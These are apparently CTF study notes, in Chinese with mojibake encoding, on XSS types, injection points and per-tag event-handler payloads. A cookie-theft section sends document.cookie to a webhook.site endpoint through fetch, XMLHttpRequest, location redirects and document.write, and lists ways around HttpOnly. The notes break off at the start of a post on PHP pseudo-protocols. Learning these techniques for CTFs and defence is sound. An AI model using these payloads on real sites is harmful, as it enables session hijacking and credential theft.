â€‹\tåå°„å‹xssåˆç§°éæŒä¹…å‹xssã€‚å‘å‡ºè¯·æ±‚æ—¶ï¼Œæ­¤ç±»XSSä»£ç å‡ºç°åœ¨URLä¸­ï¼Œä½œä¸ºè¾“å…¥æäº¤åˆ°æœåŠ¡å™¨ç«¯ï¼ŒXSSä»£ç è¢«æœåŠ¡å™¨ç«¯è§£æåä¼ å›ç»™æµè§ˆå™¨ï¼Œåè§£ææ‰§è¡ŒXSSä»£ç ã€‚ â€‹\t(2)æ”»å‡»æ–¹å¼ â€‹\tæ”»å‡»è€…å°†åŒ…å«xssä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“å…¶ä»–ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥å—è¯¥ç”¨æˆ·çš„URLä¸­å‚æ•°çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œåxssä»£ç è¢«æœåŠ¡å™¨å‘é€ç»™å…¶ä»–ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œè§¦å‘xssæ¼æ´ 2ã€å­˜å‚¨å‹(æŒä¹…åŒ–)â€‹\t(1)åŸç† â€‹\tå­˜å‚¨å‹XSSï¼Œæäº¤çš„ä»£ç ä¼šå­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå…¶ä»–ç”¨æˆ·è¯·æ±‚è¯¥é¡µé¢æ—¶ä¼šè§¦å‘xssæ¼æ´ï¼Œæ— éœ€è®¿é—®æ”»å‡»è€…çš„ç‰¹å®šé“¾æ¥ã€‚ä¾‹å¦‚ï¼šç•™è¨€æ¿ä¸­çš„XSSï¼Œç”¨æˆ·æäº¤ä¸€æ¡åŒ…å«XSSä»£ç çš„ç•™è¨€å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œå…¶ä»–ç”¨æˆ·æŸ¥çœ‹ç•™è¨€æ¿æ—¶ï¼Œé‚£äº›ç•™è¨€å°±ä¼šä»æ•°æ®åº“ä¸­åŠ è½½å‡ºæ¥å¹¶æ˜¾ç¤ºï¼Œäºæ˜¯è§¦å‘äº†XSSæ”»å‡» â€‹\t(2)æ”»å‡»æ–¹å¼ â€‹\tæ”»å‡»è€…å°†åŒ…å«xssä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œé¡µé¢è¿›è¡Œè§£æåå“åº”ï¼Œæœ€åæµè§ˆå™¨è§£ææ‰§è¡ŒXSSä»£ç ï¼Œè§¦å‘xssæ¼æ´ 3ã€DOM-basedå‹ æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ˆDOMï¼‰æ˜¯ä¸€ä¸ªç½‘ç»œæ–‡æ¡£çš„ç¼–ç¨‹æ¥å£ã€‚å®ƒä»£è¡¨é¡µé¢ï¼Œä»¥ä¾¿ç¨‹åºå¯ä»¥æ”¹å˜æ–‡æ¡£çš„ç»“æ„ã€é£æ ¼å’Œå†…å®¹ã€‚DOM å°†æ–‡æ¡£è¡¨ç¤ºä¸ºèŠ‚ç‚¹å’Œå¯¹è±¡ï¼›è¿™æ ·ï¼Œç¼–ç¨‹è¯­è¨€å°±å¯ä»¥ä¸é¡µé¢äº¤äº’ã€‚ â€‹\t(1)åŸç† â€‹\tDOMå‹xsså…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹xssï¼Œä¸åå°„å‹ç±»ä¼¼æ­¤ç±»XSSä»£ç å‡ºç°åœ¨URLä¸­ï¼Œä½†DOM XSSå’Œåå°„å‹XSSçš„åŒºåˆ«åœ¨äºDOM XSSä»£ç å¹¶ä¸éœ€è¦æœåŠ¡å™¨å‚ä¸ï¼Œä¾é å®¢æˆ·ç«¯è¿›è¡Œè§£æã€‚ â€‹\t(2)æ”»å‡»æ–¹å¼ â€‹\tä¸åå°„å‹ç±»ä¼¼ï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œå½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†xssä»£ç ï¼Œå¯¼è‡´å­˜åœ¨xssæ¼æ´ XSSä»£ç æ’å…¥ä½ç½®1.æ’å…¥åˆ°HTMLæ³¨é‡Šå†…å®¹ä¸­!-- script alert(XSS);/script-- 2.æ’å…¥åˆ°HTMLæ ‡ç­¾çš„å±æ€§å€¼ä¸­img src=image,png onerror=scriptalert(XSS)/script æ³¨ï¼šonerrorå±æ€§æ˜¯HTMLä¸­imgæ ‡ç­¾çš„ä¸€ä¸ªäº‹ä»¶å±æ€§ï¼Œå®ƒç”¨äºå®šä¹‰å½“å›¾åƒåŠ è½½å¤±è´¥æ—¶æ‰§è¡Œçš„JavaScriptä»£ç ã€‚ 3.æ’å…¥åˆ°HTMLæ ‡ç­¾çš„å±æ€§åä¸­ä½¿ç”¨è¯­å¥ scriptalert(XSS)/script æ„é€ é—­åˆï¼Œå¯å¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š input type=text name=scriptalert(XSS)/script åˆ©ç”¨æ„é€ é—­åˆçš„æ–¹å¼å°†æ¶æ„ä»£ç æ’å…¥åˆ°æŸä¸ªæ ‡ç­¾ä¸­ï¼Œå°†æ¶æ„ä»£ç æ’å…¥åˆ°äº†æ ‡ç­¾ä¸­çš„å±æ€§å€¼ä¸­ï¼Œå®ç°XSSæ”»å‡» 4.æ’å…¥åˆ°HTMLæ ‡ç­¾åä¸­ script alert(XSS) /scriptimg src=/1.png æµè§ˆå™¨ä¼šå°†ç¬¬ä¸€ä¸ªå°–æ‹¬å·è§†ä¸ºæ•´ä½“æ ‡ç­¾åçš„èµ·å§‹ç¬¦å·ï¼Œè€Œç¬¬äºŒä¸ªå°–æ‹¬å·åˆ™æ˜¯script æ ‡ç­¾çš„èµ·å§‹ç¬¦å·ï¼Œå¯¼è‡´æµè§ˆå™¨è¯¯ä»¥ä¸ºæœ‰ä¸¤ä¸ªæ ‡ç­¾è¢«åµŒå¥—åœ¨ä¸€èµ·ï¼Œä»è€Œå®ç°XSSæ”»å‡» 6.æ’å…¥åˆ°CSSä¸­div style=background-image:url(javascript:alert(`1`)); æˆ‘ä»¬åœ¨background-imageæ ·å¼å±æ€§ä¸­æ’å…¥äº†ä¸€æ®µJavaScript urlï¼ˆåœ¨è¿‡å»ï¼Œä¸€äº›æµè§ˆå™¨å¯èƒ½æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¿™ç§ç”¨æ³•ï¼Œå…è®¸javascript:ä¼ªåè®®åœ¨CSSå±æ€§ä¸­æ‰§è¡ŒJavaScriptä»£ç ã€‚ï¼‰ï¼Œå½“ç”¨æˆ·æ‰“å¼€è¿™ä¸€ä¸ªé¡µé¢æ—¶ï¼Œä¼šæ‰§è¡Œå¼¹çª—ï¼Œæµè§ˆå™¨ä¼šæ‰§è¡Œæˆ‘ä»¬æ’å…¥çš„javaä¼ªåè®®ä»£ç ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚ 7.æ’å…¥åˆ°HTTPå“åº”ä¸­å…ˆç•™ä¸€ä¸ªå‘ï¼Œè¿˜æ²¡çœ‹æ‡‚è¿™ä¸ªéƒ¨åˆ†ï¼Œåé¢å†æ¥å¡« è¿è¡Œè„šæœ¬çš„æ ‡ç­¾ä»¥åŠå¯¹åº”å±æ€§a æ ‡ç­¾ å¯¹åº”å±æ€§ï¼š hrefå±æ€§ï¼ˆæ‰‹åŠ¨ç‚¹å‡»ï¼‰ a href=javascript:alert(1)test/a onfocusï¼ˆè·å–ç„¦ç‚¹æ—¶è§¦å‘XSSï¼Œå¦‚:ç‚¹å‡»ï¼‰ a href=x onfocus=alert(xss); autofocus=xss/a onclickï¼ˆç‚¹å‡»æ—¶è§¦å‘XSSï¼‰ a href=x onclick=eval(alert(xss);)xss/a onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ a href=x onmouseover=alert(xss);xss/a onmouseoutï¼ˆé¼ æ ‡ç§»å‡ºæ—¶è§¦å‘XSSï¼‰ã€‚ a href=x onmouseout=alert(xss);xss/a imgæ ‡ç­¾å¯¹åº”å±æ€§ï¼š onerrorï¼ˆåŠ è½½é”™è¯¯æ—¶è§¦å‘XSSã€å°†srcä¹±è¾“å…¥ä¸€ä¸ªå€¼å³å¯ï¼‰ img src=x onerror=alert(1)img src=x onerror=eval(alert(1)) onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ img src=1 onmouseover=alert(xss); onmouseoutï¼ˆé¼ æ ‡ç§»å‡ºæ—¶è§¦å‘XSSï¼‰ img src=1 onmouseout=alert(xss);v onclickï¼ˆç‚¹å‡»æ—¶è§¦å‘XSSï¼‰ã€‚ img src=1 onclick=alert(xss); iframeæ ‡ç­¾HTML å†…è”æ¡†æ¶å…ƒç´  (iframe) å¯¹åº”å±æ€§ï¼š onloadï¼ˆåŠ è½½å®Œæˆæ—¶è§¦å‘XSSï¼‰ iframe onload=alert(document.cookie)/iframeiframe onload=alert(xss);/iframeiframe onload=base64,YWxlcnQoJ3hzcycpOw==/iframe onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ã€‚ iframe onmouseover=alert(xss);/iframe srcå±æ€§ iframe src=javascript:alert(1)test/iframeiframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= //base64è§£ç åä¸ºscriptalert(xss)/script audio æ ‡ç­¾audio æ ‡ç­¾å®šä¹‰å£°éŸ³ï¼Œæ¯”å¦‚éŸ³ä¹æˆ–å…¶ä»–éŸ³é¢‘æµã€‚ å¯¹åº”å±æ€§ï¼š onerrorï¼ˆåŠ è½½é”™è¯¯æ—¶è§¦å‘XSSï¼‰ audio src=1 onerror=alert(1)audiosource src=x onerror=alert(xss);/audio onfocusï¼ˆè·å–ç„¦ç‚¹æ—¶è§¦å‘XSSï¼Œå¦‚:ç‚¹å‡»ï¼‰ audio controls onfocus=eval(alert(xss);) autofocus=/audio onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ã€‚ audio controls onmouseover=alert(xss);source src=x/audio videoæ ‡ç­¾å¯¹åº”å±æ€§ï¼š onerrorï¼ˆåŠ è½½é”™è¯¯æ—¶è§¦å‘XSSï¼‰ video src=x onerror=alert(1)videosource onerror=alert(xss);/video onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ video controls onmouseover=alert(xss);/video onfocusï¼ˆè·å–ç„¦ç‚¹æ—¶è§¦å‘XSSï¼Œå¦‚:ç‚¹å‡»ï¼‰ video controls onfocus=alert(xss); autofocus=/video onclickï¼ˆç‚¹å‡»æ—¶è§¦å‘XSSï¼‰ã€‚ video controls onclick=alert(xss);/video svg æ ‡ç­¾å¯¹åº”å±æ€§ï¼š onloadï¼ˆåŠ è½½å®Œæˆæ—¶è§¦å‘XSSï¼‰ svg onload=javascript:alert(1)svg onload=alert(xss);/svg button æ ‡ç­¾å¯¹åº”å±æ€§ï¼š onclickï¼ˆç‚¹å‡»æ—¶è§¦å‘XSSï¼‰ button onclick=alert(1)button onclick=alert(xss);xss/button onfocusï¼ˆè·å–ç„¦ç‚¹æ—¶è§¦å‘XSSï¼Œå¦‚:ç‚¹å‡»ï¼‰ button onfocus=alert(xss); autofocus=xss/button onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ button onmouseover=alert(xss);xss/button onmouseoutï¼ˆé¼ æ ‡ç§»å‡ºæ—¶è§¦å‘XSSï¼‰ button onmouseout=alert(xss);xss/button onmouseupï¼ˆé¼ æ ‡æŒ‰é’®é‡Šæ”¾æ—¶è§¦å‘XSSï¼‰ button onmouseup=alert(xss);xss/button onmousedownï¼ˆé¼ æ ‡æŒ‰é’®æŒ‰ä¸‹æ—¶è§¦å‘XSSï¼‰ã€‚ button onmousedown=alert(xss);/button divæ ‡ç­¾å¯¹åº”å±æ€§ï¼š onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ è¿™ä¸ªéœ€è¦å€ŸåŠ©urlç¼–ç æ¥å®ç°ç»•è¿‡ åŸä»£ç ï¼šdiv onmouseover=alert(1)DIV/divç»è¿‡urlç¼–ç ï¼šdiv onmouseover%3dalert%26lpar%3b1%26rpar%3bDIV%2fdiv objectæ ‡ç­¾è¿™ä¸ªéœ€è¦å€ŸåŠ© data ä¼ªåè®®å’Œ base64 ç¼–ç æ¥å®ç°ç»•è¿‡ object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=/object script æ ‡ç­¾scriptalert(xss)/scriptscriptalert(/xss/)/scriptscriptalert(123)/script p æ ‡ç­¾å¯¹åº”å±æ€§ï¼š onclickï¼ˆç‚¹å‡»æ—¶è§¦å‘XSSï¼‰ p onclick=alert(xss);xss/p onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ p onmouseover=alert(xss);xss/p onmouseoutï¼ˆé¼ æ ‡ç§»å‡ºæ—¶è§¦å‘XSSï¼‰ p onmouseout=alert(xss);xss/p onmouseupï¼ˆé¼ æ ‡æŒ‰é’®é‡Šæ”¾æ—¶è§¦å‘XSSï¼‰ã€‚ p onmouseup=alert(xss);xss/p input æ ‡ç­¾å¯¹åº”å±æ€§ï¼š onclickï¼ˆç‚¹å‡»æ—¶è§¦å‘XSSï¼‰ input onclick=alert(xss); onfocusï¼ˆè·å–ç„¦ç‚¹æ—¶è§¦å‘XSSï¼Œå¦‚:ç‚¹å‡»ï¼‰ input onfocus=alert(xss);input onfocus=alert(xss); autofocus= onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ input onmouseover=alert(xss); onkeydownï¼ˆé”®ç›˜æŒ‰é”®æŒ‰ä¸‹æ—¶è§¦å‘XSSï¼‰ã€‚ input type=text onkeydown=alert(xss);/inputinput type=text onkeydown=alert(xss);/input onkeydownï¼ˆåœ¨é”®ç›˜æŒ‰é”®æŒ‰ä¸‹å¹¶é‡Šæ”¾ä¸€ä¸ªé”®æ—¶è§¦å‘XSSï¼‰ã€‚ input type=text onkeypress=alert(xss);/input detailsæ ‡ç­¾å¯¹åº”å±æ€§ï¼š ontoggleï¼ˆåˆ‡æ¢æ—¶è§¦å‘XSSï¼Œå¦‚:è¯¦æƒ…å…ƒç´ å±•å¼€æˆ–æ”¶èµ·ï¼‰ã€‚ details ontoggle=alert(xss);/detailsdetails ontoggle=alert(xss); open=/details select æ ‡ç­¾å¯¹åº”å±æ€§ï¼š onfocusï¼ˆè·å–ç„¦ç‚¹æ—¶è§¦å‘XSSï¼Œå¦‚:ç‚¹å‡»ï¼‰ select onfocus=alert(xss); autofocus/select onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ select onmouseover=alert(xss);/select onclickï¼ˆç‚¹å‡»æ—¶è§¦å‘XSSï¼‰ã€‚ select onclick=eval(alert(xss);)/select form æ ‡ç­¾å¯¹åº”å±æ€§ï¼š onmouseoverï¼ˆé¼ æ ‡æ‚¬åœäºè¯¥å…ƒç´ æ—¶è§¦å‘XSSï¼‰ form method=x action=x onmouseover=alert(xss);input type=submit/form onmouseoutï¼ˆé¼ æ ‡ç§»å‡ºæ—¶è§¦å‘XSSï¼‰ form method=x action=x onmouseout=alert(xss);input type=submit/form onmouseupï¼ˆé¼ æ ‡æŒ‰é’®é‡Šæ”¾æ—¶è§¦å‘XSSï¼‰ã€‚ form method=x action=x onmouseup=alert(xss);input type=submit/form actionï¼ˆæäº¤è¡¨å•æ—¶è§¦å‘ï¼‰ form action=javascript:alert(1)input type=submit/form body æ ‡ç­¾å¯¹åº”å±æ€§ï¼š onloadï¼ˆåŠ è½½å®Œæˆæ—¶è§¦å‘XSSï¼‰ body onload=alert(xss);/body å¤–å¸¦COOKIEè·å–cookieæœªè®¾ç½®ä¸ºHttpOnlyæ–¹æ³•ï¼šdocument.cookieå¯è·å¾—æ‰€æœ‰çš„ Cookieï¼Œæ¯æ¡ cookie ä»¥åˆ†å·å’Œç©ºæ ¼ åˆ†éš” (å³ï¼Œ key=value é”®å€¼å¯¹)ã€‚ä¾‹å¦‚ï¼š uid=a378eb5d1c4e12d492e63273f7b68c01%40devS; language=zh; _gat=1 è®¾ç½®ä¸ºHttpOnly HttpOnlyæ˜¯åŒ…å«åœ¨Set-Cookie HTTPå“åº”å¤´æ–‡ä»¶ä¸­çš„é™„åŠ æ ‡å¿—ã€‚ç”Ÿæˆcookieæ—¶ä½¿ç”¨HttpOnlyæ ‡å¿—æœ‰åŠ©äºé™ä½å®¢æˆ·ç«¯è„šæœ¬è®¿é—®å—ä¿æŠ¤cookieçš„é£é™©ï¼ˆå¦‚æœæµè§ˆå™¨æ”¯æŒï¼‰ã€‚ å³å¦‚æœæŸä¸€ä¸ªCookie é€‰é¡¹è¢«è®¾ç½®æˆ HttpOnly = true çš„è¯ï¼Œé‚£æ­¤Cookie åªèƒ½é€šè¿‡æœåŠ¡å™¨ç«¯ä¿®æ”¹ï¼ŒJs æ˜¯æ“ä½œä¸äº†çš„ï¼Œæ­¤æ—¶document.cookie æ— æ•ˆã€‚ æ–¹æ³•ä¸€ï¼šcookieå›æ˜¾é¡µé¢åˆ©ç”¨æœåŠ¡å™¨ä¸­çš„cookieå›æ˜¾é¡µé¢ï¼Œå¦‚ï¼šPHPinfoé¡µé¢ **æ¡ä»¶ï¼š**æœ‰ç›¸å…³è¯·æ±‚é¡µé¢å¯ä»¥å›æ˜¾å‡ºcookie å‚è€ƒé“¾æ¥ï¼šHow to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation æ–¹æ³•äºŒï¼šTRACE HTTP HTTPå®šä¹‰äº†8ç§æ ‡å‡†çš„è¯·æ±‚æ–¹æ³•ï¼ŒåŒ…æ‹¬GETã€POSTã€PUTã€DELETEã€HEADã€OPTIONSã€TRACEå’ŒCONNECTã€‚å…¶ä¸­TRACEç”¨äºå›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ã€‚ **æ¡ä»¶ï¼š**æœåŠ¡å™¨æ”¯æŒTRACEæ–¹å¼è¯·æ±‚ æ³¨ï¼šç°ä»£æµè§ˆå™¨ä¸å…è®¸ä» JS å‘é€ TRACE è¯·æ±‚ï¼Œä»è€Œé¿å…äº†è¿™ç§æŠ€æœ¯ã€‚ä½†æ˜¯ï¼Œåœ¨ç‰¹å®šè½¯ä»¶ä¸­å‘ç°äº†ä¸€äº›ç»•è¿‡æ­¤æ–¹æ³•çš„æ–¹æ³•ï¼Œä¾‹å¦‚å‘é€ \\r TRACE è€Œä¸æ˜¯ TRACE å‘é€åˆ° IE6.0 SP2ã€‚ æ–¹æ³•ä¸‰ï¼š Cookie Jar æº¢å‡ºå‚è€ƒé“¾æ¥ï¼šCookie Jar Overflowã€Cookie Jar Overflow Attack æ–¹æ³•å››ï¼šè¡¨å•åŠ«æŒXSSèƒ½æ’å…¥åœ¨ç™»å½•è¡¨å•é¡µé¢ï¼Œèƒ½ç›´æ¥è·å–ç™»å½•çš„è´¦å·å¯†ç ï¼Œä½¿ç”¨è´¦å·å¯†ç ç™»å½• æ–¹æ³•äº”ï¼šæµè§ˆå™¨æ¼æ´ã€ä¸­é—´ä»¶æ¼æ´ä¾‹å¦‚ï¼šApacheæœåŠ¡å™¨æ¼æ´ CVE-2012-0053 å½±å“ç‰ˆæœ¬ï¼š2.2.0-2.2.21 æ”»å‡»è€…å¯é€šè¿‡å‘ç½‘ç«™æ¤äººè¶…å¤§çš„Cookie,ä»¤å…¶HTTPå¤´è¶…è¿‡Apacheçš„LititRequestFieldSize (æœ€å¤§è¯·æ±‚é•¿åº¦ï¼Œ4192å­—èŠ‚)ï¼Œä½¿å¾—Apacheè¿”å›400é”™è¯¯ï¼ŒçŠ¶æ€é¡µä¸­åŒ…å«äº†HttpOnly ä¿æŠ¤çš„Cookieã€‚ å¸¦å‡ºcookiefetch()æ–¹æ³•å…¨å±€çš„ fetch() æ–¹æ³•ç”¨äºå‘èµ·è·å–èµ„æºçš„è¯·æ±‚ã€‚å®ƒè¿”å›ä¸€ä¸ª promiseï¼Œè¿™ä¸ª promise ä¼šåœ¨è¯·æ±‚å“åº”åè¢« resolveï¼Œå¹¶ä¼ å› Responseå¯¹è±¡ã€‚ä¾‹å¦‚ï¼š fetch(//webhook.site/xxxxxxxx/?cookie=+document.cookie) è¯¦ç»†å‚è€ƒï¼šfetch() - Web API æ¥å£å‚è€ƒ | MDN (mozilla.org) XMLHttpRequest å¯¹è±¡åˆ©ç”¨ XMLHttpRequest å¯¹è±¡å‘é€ HTTP è¯·æ±‚ï¼Œå°† Cookie æ•°æ®å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š scriptvar xhr = new XMLHttpRequest(); xhr.open(GET, //webhook.site/xxxxxxxx/?cookie=+document.cookie, true); xhr.send();/script è¯¦ç»†å‚è€ƒï¼šXMLHttpRequest - Web API æ¥å£å‚è€ƒ | MDN (mozilla.org) window.location å¯¹è±¡ window.location å¯ä»¥æŠŠæµè§ˆå™¨é‡å®šå‘åˆ°æ–°çš„é¡µé¢ï¼Œæ­¤æ—¶å¯é€šè¿‡urlæºå¸¦cookieï¼›ä½¿ç”¨æ–¹æ³•ä¾‹å¦‚ï¼š scriptwindow.location=//webhook.site/xxxxxxxx/?cookie=+document.cookie;/script ä¸‹é¢æ˜¯window.location å¯¹è±¡ä¸­å¯ç”¨äºè·³è½¬çš„æ–¹æ³•ï¼š window.location.hrefï¼š window.location.href = //webhook.site/xxxxxxxx/?cookie=+document.cookie; window.location.assign(url)ï¼š window.location.assign(//webhook.site/xxxxxxxx/?cookie=+document.cookie); window.location.replace(url)ï¼š window.location.replace(//webhook.site/xxxxxxxx/?cookie=+document.cookie); window.openæ–¹æ³•window.open() æ˜¯ JavaScript ä¸­ç”¨äºæ‰“å¼€æ–°çª—å£æˆ–æ–°æ ‡ç­¾é¡µçš„æ–¹æ³•ã€‚å®ƒæ¥å—ä¸€ä¸ª URL ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„æµè§ˆå™¨çª—å£å¯¹è±¡æˆ–è€…é€‰é¡¹å¡å¯¹è±¡ã€‚ ä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç å°†ä¼šåœ¨æ–°çª—å£æˆ–æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€æŒ‡å®š URLï¼š window.open(//webhook.site/xxxxxxxx/?cookie=+document.cookie); document.writeæ–¹æ³•åˆ©ç”¨ document.write å†™å…¥æŸäº›å«æœ‰srcå±æ€§çš„æ ‡ç­¾ï¼Œå¹¶å°†Cookieæ‹¼æ¥åˆ°ç›®æ ‡URLä¸­ï¼Œä½œä¸ºå‚æ•°å‘é€åˆ°æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ scriptdocument.write(`img src=//webhook.site/xxxxxxxx/?cookie=$document.cookie `)/script scriptdocument.write(img src=//webhook.site/xxxxxxxx/?cookie=+document.cookie+/)/script é™„ï¼šå¸¦srcå±æ€§çš„æ ‡ç­¾ imgï¼š img src=image.jpg alt=ç¤ºä¾‹å›¾ç‰‡ scriptï¼š script src=script.js/script iframeï¼š iframe src=page.html/iframe video å’Œ audioï¼š video src=video.mp4 controls/video audio src=audio.mp3 controls/audio embed å’Œ objectï¼š embed src=file.pdf type=application/pdf object data=file.swf type=application/x-shockwave-flash/object æ›´å¤šæ­£åœ¨å­¦ä¹ ä¸­â€¦..jquery-ajax iCeServer Superagent socket axios jQuery AJAX é¦–å…ˆç¡®ä¿ä½ çš„é¡¹ç›®ä¸­å·²ç»åŒ…å«äº†jQueryã€‚å¦‚æœæ²¡æœ‰ï¼Œä½ å¯ä»¥é€šè¿‡æ·»åŠ ä»¥ä¸‹æ ‡ç­¾æ¥å¼•å…¥ï¼š html script src=https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js/script å‘é€è¯·æ±‚çš„ç¤ºä¾‹ä»£ç ï¼š javascript $.ajax( url: YOUR_ENDPOINT_HERE, method: GET, // æˆ–è€… POST, PUT, DELETE, ç­‰ã€‚ success: function(data) console.log(data); , error: function(error) console.error(Request Failed:, error); ); Axios Axiosä¸æ˜¯åŸç”Ÿæ”¯æŒçš„ï¼Œéœ€è¦å¼•å…¥ã€‚ä½ å¯ä»¥é€šè¿‡CDNæ·»åŠ Axiosï¼š html script src=https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js/script ä½¿ç”¨Axioså‘é€è¯·æ±‚ï¼š javascript axios.get(YOUR_ENDPOINT_HERE) .then(function (response) console.log(response.data); ) .catch(function (error) console.error(Request Failed:, error); ); Superagent Superagentä¹Ÿéœ€è¦å¼•å…¥ã€‚é€šè¿‡CDNæ·»åŠ Superagentï¼š html script src=https://cdnjs.cloudflare.com/ajax/libs/superagent/6.1.0/superagent.min.js/script ä½¿ç”¨Superagentå‘é€è¯·æ±‚ï¼š javascript superagent .get(YOUR_ENDPOINT_HERE) .end((err, res) = if (err) return console.error(Request Failed:, err); console.log(res.body); ); WebSocket WebSocketæ˜¯HTML5çš„ä¸€éƒ¨åˆ†ï¼Œä¸éœ€è¦é¢å¤–å¼•å…¥ã€‚ä½†WebSocketç”¨äºå®ç°åŒå‘é€šä¿¡ï¼Œä¸åŒäºå¸¸è§„çš„HTTPè¯·æ±‚ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„WebSocketç¤ºä¾‹ï¼š javascript var socket = new WebSocket(wss://YOUR_WEBSOCKET_ENDPOINT_HERE);socket.onopen = function(event) socket.send(Hello Server!); // å‘é€æ•°æ®åˆ°æœåŠ¡å™¨;socket.onmessage = function(event) console.log(Message from server , event.data);; Fetch API Fetch APIæ˜¯ç°ä»£æµè§ˆå™¨åŸç”Ÿæ”¯æŒçš„ï¼Œä¸éœ€è¦å¼•å…¥ä»»ä½•é¢å¤–çš„åº“ï¼š javascript fetch(YOUR_ENDPOINT_HERE) .then(response = response.json()) // å‡è®¾æœåŠ¡å™¨è¿”å›çš„æ˜¯JSONæ•°æ® .then(data = console.log(data)) .catch(error = console.error(Request Failed:, error)); è¯·æ›¿æ¢ YOUR_ENDPOINT_HERE å’Œ wss://YOUR_WEBSOCKET_ENDPOINT_HERE ä¸ºä½ å®é™…çš„è¯·æ±‚URLæˆ–WebSocketç«¯ç‚¹ã€‚æ¯ç§æ–¹æ³•éƒ½æœ‰å…¶ç‰¹å®šçš„ä½¿ç”¨åœºæ™¯å’Œä¼˜åŠ¿ï¼Œé€‰æ‹©åˆé€‚çš„æ ¹æ®ä½ çš„é¡¹ç›®éœ€æ±‚è€Œå®šã€‚","tags":["CTF-Web","Web-XSS"],"categories":["web"]},{"title":"å¸¸è§åè®®ä¸PHPä¼ªåè®®","path":"/posts/b1f1aefc/","content":"å¸¸è§åè®®ä¸å°è£…åè®®1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ2 http:// â€” è®¿é—® HTTP(s) ç½‘å€3 ftp:// â€” è®¿é—® FTP(s) URLs4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ(I/O streams)5 zlib:// â€” å‹ç¼©æµ6 data:// â€” æ•°æ®(RFC 2397)7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼8 phar:// â€” PHP å½’æ¡£9 ssh2:// â€” Secure Shell 210 rar:// â€” RAR11 ogg:// â€” éŸ³é¢‘æµ12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ file:è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œè‹¥ä¸åŠ åè®®åç§°ï¼Œé»˜è®¤å°è£…åè®®ä¸ºfile://åè®® æ¡ä»¶ï¼š allow_url_fopen:offon allow_url_include :offon ä½œç”¨ï¼šç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼ˆæœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼‰ï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚ è¯´æ˜ï¼šå½“ä¸è¯´æ˜ä½¿ç”¨file:åè®®çš„æ—¶ï¼ˆå³é»˜è®¤file:åè®®çš„æƒ…å†µï¼‰å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œå½“ä½¿ç”¨äº†fileåè®®æ—¶æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚ cmd=file://flag #ç”¨æ³•é”™è¯¯ï¼Œå£°æ˜fileåè®®æ—¶æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„cmd=file:///flag 